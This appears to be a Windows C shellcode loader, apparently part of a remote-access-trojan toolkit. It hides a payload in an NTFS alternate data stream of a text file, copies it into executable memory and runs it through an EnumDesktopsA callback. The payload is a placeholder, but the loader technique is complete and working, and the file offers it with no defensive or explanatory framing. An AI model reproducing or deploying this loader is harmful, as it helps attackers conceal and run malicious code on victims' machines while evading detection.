#include <windows.h>
#include <stdio.h>

int main() {
  char* filename = "C:\\Users\\snowwolf\\Desktop\\rat\\tips\\h\\snowwolf.txt";
  char* streamname = "hiddenstream";
  char fullpath[1024];
  sprintf(fullpath, "%s:%s", filename, streamname);

  unsigned char shellcode[] = "[Shellcode]";  //嵌入Shellcode

  HANDLE hFile = CreateFile(fullpath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  DWORD bw;
  WriteFile(hFile, shellcode, sizeof(shellcode) - 1, &bw, NULL);
  CloseHandle(hFile);
  hFile = CreateFile(fullpath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  unsigned char data[sizeof(shellcode) - 1];
  DWORD br;
  ReadFile(hFile, data, sizeof(data), &br, NULL);
  CloseHandle(hFile);
  LPVOID mem = VirtualAlloc(NULL, sizeof(data), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, data, sizeof(data));
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
  return 0;
}
